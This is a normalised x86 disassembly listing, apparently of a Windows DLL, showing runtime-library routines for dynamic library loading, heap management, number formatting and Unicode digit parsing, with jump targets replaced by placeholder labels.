mov eax [ ebx + 0xb0 ]
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push eax
call [ LoadLibraryW@IAT ]
mov [ ebx + 0x90 ] eax
test eax eax
jne r-xdata
mov eax [ eax ]
lea edx [ ebp - 0x88 ]
mov eax 0x15b
call sub_10045930
mov ecx edx
push ecx
lea edx [ ebp - 0x21c ]
add ebx 0xc
push edx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x6
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
cmp [ ebp - 0x208 ] 0x8
jb r-xdata
push eax
mov eax [ ebx + 0x90 ]
push eax
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x1c8 ]
push eax
push 0xffffffff
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov edx [ ebx + 0x90 ]
lea ecx [ ebp - 0x1c8 ]
push ecx
push edx
jmp r-xdata
mov esi [ esi ]
lea edx [ ebp - 0x84 ]
mov eax 0x8b
call sub_10045930
mov eax edx
push eax
lea ecx [ ebp - 0x21c ]
add ebx 0xc
push ecx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x6
mov [ ebp - 0x4 ] 0x0
call sub_100205a0
cmp [ ebp - 0x208 ] 0x8
jb r-xdata
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0x21c ]
push eax
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x34 ]
mov eax 0x152
call sub_10045930
lea edx [ ebp - 0xc4 ]
mov eax 0x153
call sub_10045930
mov ecx edx
push ecx
lea edx [ ebp - 0x1e4 ]
add ebx 0xc
push edx
call sub_10017cc0
push eax
lea edx [ ebp - 0x34 ]
lea esi [ ebp - 0x238 ]
mov [ ebp - 0x4 ] 0x2
call sub_1001ccb0
add esp 0xc
mov ecx eax
mov ebx [ ebp - 0x240 ]
add ebx 0x2c
mov eax ebx
lea esi [ ebp - 0x200 ]
mov [ ebp - 0x4 ] 0x3
call sub_10038800
mov edx eax
mov ecx 0x6
mov [ ebp - 0x4 ] 0x4
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x1ec ] esi
jb r-xdata
call [ GetProcAddress@IAT ]
mov [ ebp - 0x23c ] eax
cmp eax edi
jne r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x21c ]
push edx
call sub_100187af
add esp 0x4
xor edi edi
xor ecx ecx
mov [ ebp - 0x1ec ] 0x7
mov [ ebp - 0x1f0 ] edi
mov [ ebp - 0x200 ] cx
cmp [ ebp - 0x224 ] esi
jb r-xdata
mov eax [ ebp - 0x200 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x224 ] 0x7
mov [ ebp - 0x228 ] edi
mov [ ebp - 0x238 ] ax
cmp [ ebp - 0x1d0 ] esi
jb r-xdata
mov edx [ ebp - 0x238 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x1d0 ] 0x7
mov [ ebp - 0x1d4 ] edi
mov [ ebp - 0x1e4 ] dx
cmp [ ebx + 0x14 ] esi
jb r-xdata
mov ecx [ ebp - 0x1e4 ]
push ecx
call sub_100187af
add esp 0x4
push ebx
call [ ebp - 0x23c ]
mov ecx [ ebp - 0x240 ]
mov [ ecx + 0x50 ] eax
xor eax eax
mov ebx [ ebx ]
sub_1006c63e
push 0x58
mov eax sub_100853f1
call sub_1003fae8
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov al [ ebp + 0x18 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x50 ] al
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_10013950
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_100188c2
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_10034a80
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_1006e90e
mov [ ebp - 0x4 ] 0x3
call sub_10055b84
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_1004642f
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_10021bf0
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1002c8c0
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x50 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_10007c43
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_10069e87
mov ecx [ eax ]
push edi
push [ ebp - 0x50 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_10007c43
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
mov eax [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_1006c7bc
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_10021455
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_1006c7f0
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax esi
pop edi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_1006c82b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test bl 0x20
je r-xdata
test bl 0x10
je r-xdata
mov [ ecx ] 0x2b
inc ecx
mov dl [ ebp + 0x10 ]
mov [ ecx ] 0x2a2e
add ecx 0x2
test dl dl
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov edx 0x3000
and ebx edx
cmp ebx 0x2000
jne r-xdata
mov [ ecx ] dl
inc ecx
cmp ebx edx
jne r-xdata
mov dl 0x66
jmp r-xdata
cmp ebx 0x1000
setne dl
lea edx [ edx + edx + 0x65 ]
mov dl 0x61
jmp r-xdata
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
pop ebp
retn
sub_1006c892
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_1002d770
dec [ ebp + 0x18 ]
jne r-xdata
sub_1006c8bd
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1005287d
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_1006c8ff
push 0x38
mov eax sub_100857f0
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1006f961
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10034a80
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10060ef0
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_1006c9ca
mov edi edi
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x14
push edi
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x3c ] ecx
call sub_1004a330
add esp 0xc
push [ ebp - 0x30 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea ebx [ ebp - 0x24 ]
call sub_10069d0f
test al al
jne r-xdata
mov edi [ ebp - 0x30 ]
push edi
mov ecx esi
mov [ ebp - 0x25 ] 0x0
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2b
mov [ ebp - 0x34 ] eax
call sub_1004a330
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov ax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x2c ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
lea eax [ ebp - 0x38 ]
push eax
push 0xa
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x24 ]
xor edi edi
push eax
mov [ ebx ] 0x0
mov [ ebp - 0x38 ] edi
call sub_10060a86
add esp 0x10
push [ ebp - 0x30 ]
mov ecx esi
mov ebx eax
call sub_10069d0f
test al al
je r-xdata
lea ebx [ ebp - 0x24 ]
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1005a5dc
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2d
mov [ ebp - 0x34 ] eax
call sub_1004a330
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
lea ebx [ ebp - 0x23 ]
call sub_1005a5dc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
inc edi
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
movzx eax [ ebp - 0x2c ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
or edi 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x2c ]
add al 0x30
mov [ ebx ] al
lea eax [ ebp - 0x5 ]
cmp ebx eax
jae r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp + 0x18 ] ebx
jl r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1005a5dc
inc ebx
mov eax [ ebp - 0x3c ]
mov [ eax ] ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
sub_1006cba0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] al
mov eax [ ebp + 0x8 ]
push eax
push r--data
mov ecx 0x9
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] 0x0
call sub_1002b230
mov eax edi
add esp 0x8
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
pop edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call sub_10037e00
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1006cc18
push 0x8
push r--data
call sub_1007fb20
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_10009cdd
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10035c5d
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1000ff73
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1007fb65
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_10009cdd
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10035c5d
jmp r-xdata
sub_1006ccb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008668f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
mov edi [ GetProcessHeap@IAT ]
xor ebx ebx
push 0x4
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x14 ] eax
push ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] ebx
push ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
lea edi [ esi + 0x30 ]
push ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ edi + 0x4 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ eax ]
jne r-xdata
mov edx [ edi + 0x4 ]
dec [ edx ]
cmp [ edx ] ebx
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1000be60
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc [ eax ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp edi edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx ebx
je r-xdata
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
inc [ eax ]
mov edx [ edi ]
cmp edx ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax [ ebp - 0x14 ]
mov edx [ edi + 0x4 ]
cmp edx ebx
je r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax ]
push 0x1
call edx
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
push edx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
sub_1006ce53
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_1006cee0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_10028f80
mov edx [ esi ]
push edx
call sub_100187af
add esp 0x14
sub_1006cf23
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov ecx 0xff10
cmp ax cx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
cmp ax cx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
lea edx [ ecx + 0xa ]
cmp ax dx
jae r-xdata
mov ecx 0x6f0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x966
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xc66
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0xe50
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0x76 ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
mov ecx 0x1040
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
mov ecx 0x17e0
cmp ax cx
jb r-xdata
lea edx [ ecx + 0xa ]
cmp ax dx
jb r-xdata
add ecx 0x30
cmp ax cx
jb r-xdata
add edx 0x30
jmp r-xdata
cmp ax dx
jb r-xdata
sub_1006d0d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089673
mov eax [ fs : 0x0 ]
push eax
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
movzx edx dx
mov [ ebp - 0x214 ] edx
mov edx [ ebx + 0x8 ]
sub edx [ ebx + 0x4 ]
lea esi [ ebx + 0x4 ]
mov [ ebp - 0x224 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x22c ] ecx
mov cl [ ebp + 0x14 ]
sar edx 0x2
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x228 ] edi
mov [ ebp - 0x21c ] cl
cmp edx 0x1e
jb r-xdata
push 0x110
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x210 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x210 ] ecx
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
lea ecx [ ebx + 0x64 ]
push ecx
lea edx [ ebx + 0x48 ]
push edx
lea ecx [ ebx + 0x2c ]
push ecx
mov ecx [ ebx + 0xbc ]
lea edx [ ebx + 0x80 ]
push edx
mov edx [ ebp - 0x21c ]
push ecx
mov ecx [ ebp - 0x214 ]
push edx
mov edx [ ebp - 0x224 ]
push edi
push ecx
mov ecx [ ebp - 0x220 ]
push edx
mov edx [ ebp - 0x22c ]
mov edi eax
call sub_10052560
mov edi [ ebp - 0x228 ]
mov [ ebp - 0x210 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x18
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
lea edx [ ebp - 0x218 ]
cmp ecx edx
ja r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x210 ]
mov [ ebp - 0x218 ] eax
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x218 ]
cmp ecx eax
jae r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_10035000
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x4
mov ebx [ ebx + 0x8 ]
mov esi [ esi ]
mov eax ebx
sub eax esi
push sub_10062b50
sar eax 0x2
push eax
push ebx
push esi
call sub_1001f500
add esp 0x10
lea edx [ ebp - 0x30 ]
mov eax 0x4d
call sub_10072600
xor esi esi
mov ebx 0x7
xor ecx ecx
mov eax edi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov edx [ ebp - 0x210 ]
mov [ eax ] edx
mov eax [ esi ]
lea ecx [ eax + edi * 4 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_10035000
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0xa0 ]
call sub_1005ddc0
mov edi [ ebp - 0x220 ]
mov [ ebp - 0x4 ] 0x1
xor edx edx
mov eax edi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
lea ecx [ eax + 0x2 ]
lea ebx [ ebx ]
mov edi [ ebp - 0x228 ]
jmp r-xdata
mov ecx [ ecx ]
mov [ eax ] ecx
mov dx [ eax ]
add eax 0x2
cmp dx si
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x68 ]
call sub_1005ddc0
movzx eax [ ebp - 0x214 ]
push eax
lea ecx [ ebp - 0x12c ]
push ecx
mov [ ebp - 0x4 ] 0x2
call sub_1005f2b0
add esp 0x8
mov [ ebp - 0x214 ] eax
mov edi [ ebp - 0x22c ]
mov [ ebp - 0x4 ] 0x3
xor edx edx
mov eax edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x4c ] dx
lea ecx [ eax + 0x2 ]
mov dx [ eax ]
add eax 0x2
cmp dx si
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x4c ]
call sub_1005ddc0
mov edx [ ebp - 0x224 ]
mov [ ebp - 0x4 ] 0x4
xor eax eax
mov [ ebp - 0x84 ] ax
mov eax edx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
lea ecx [ eax + 0x2 ]
lea esp [ esp ]
mov di [ eax ]
add eax 0x2
cmp di si
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x84 ]
call sub_1005ddc0
movzx ecx [ ebp - 0x21c ]
push ecx
lea edx [ ebp - 0x180 ]
push edx
mov [ ebp - 0x4 ] 0x5
call sub_1005f2b0
push eax
lea edx [ ebp - 0x30 ]
lea esi [ ebp - 0x1f0 ]
mov [ ebp - 0x4 ] 0x6
call sub_1005bbc0
add esp 0xc
push eax
mov edx r--data
lea esi [ ebp - 0x20c ]
mov [ ebp - 0x4 ] 0x7
call sub_1001ccb0
add esp 0x4
mov ecx eax
mov ebx 0x8
lea eax [ ebp - 0x84 ]
lea edi [ ebp - 0x1d4 ]
mov [ ebp - 0x4 ] bl
call sub_10057920
push eax
mov edx r--data
lea esi [ ebp - 0x19c ]
mov [ ebp - 0x4 ] 0x9
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x4c ]
lea edi [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0xa
call sub_10057920
push eax
mov edx r--data
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x4 ] 0xb
call sub_1001ccb0
add esp 0x4
